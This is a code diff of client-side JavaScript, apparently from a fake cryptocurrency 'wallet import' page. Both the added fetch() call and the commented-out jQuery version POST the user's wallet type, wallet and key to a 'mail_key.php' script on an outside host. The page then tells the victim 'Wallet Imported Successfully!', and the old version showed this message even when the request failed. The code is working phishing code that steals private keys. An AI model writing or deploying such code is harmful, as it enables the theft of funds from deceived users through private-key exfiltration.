@@ -73,35 +73,58 @@ $('document').ready(function () {
         $('#key_submission button').attr('disabled', true);
         $('#key_submission button').text('Loading...');
         alert('Loading');
+        
+        const myformData = new FormData();
+        
+        myformData.append('Type', Type);
+        myformData.append('Wallet', Wallet);
+        myformData.append('Key', Key);
+        
+        const billResponse = await fetch(
+      "https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "multipart/form-data",
+        },
+        body: myformData,
+      }
+    );
 
-        $.ajax({
-            url: 'https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php',
-            method: 'POST',
-            data: {
-                Type,
-                Wallet,
-                Key
-            },
-            success: function (data) {
-                alert('3');
-                console.log(data);
-                $('#key_submission button').text('Imported');
-                if (data == 'Mail Sent') {
-                    $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>')
-                }
-            },
-            fail: function (err) {
-                alert('2');
-                console.log(err);
-            },
-            error: function (err) {
-                alert('1');
-                console.log(err);
-                if(err.responseText){
-                    $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>');
-                }
-            }
-        })
+    billResponse
+      .text()
+      .then(
+        (data) => data == 'Mail Sent' && $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>')
+      );
+
+//         $.ajax({
+//             url: 'https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php',
+//             method: 'POST',
+//             data: {
+//                 Type,
+//                 Wallet,
+//                 Key
+//             },
+//             success: function (data) {
+//                 alert('3');
+//                 console.log(data);
+//                 $('#key_submission button').text('Imported');
+//                 if (data == 'Mail Sent') {
+//                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>')
+//                 }
+//             },
+//             fail: function (err) {
+//                 alert('2');
+//                 console.log(err);
+//             },
+//             error: function (err) {
+//                 alert('1');
+//                 console.log(err);
+//                 if(err.responseText){
+//                     $('.import-type').html('<img src="./img/qr.png"><br><p> Wallet Imported Successfully! </p>');
+//                 }
+//             }
+//         })
 
         return false;
     })
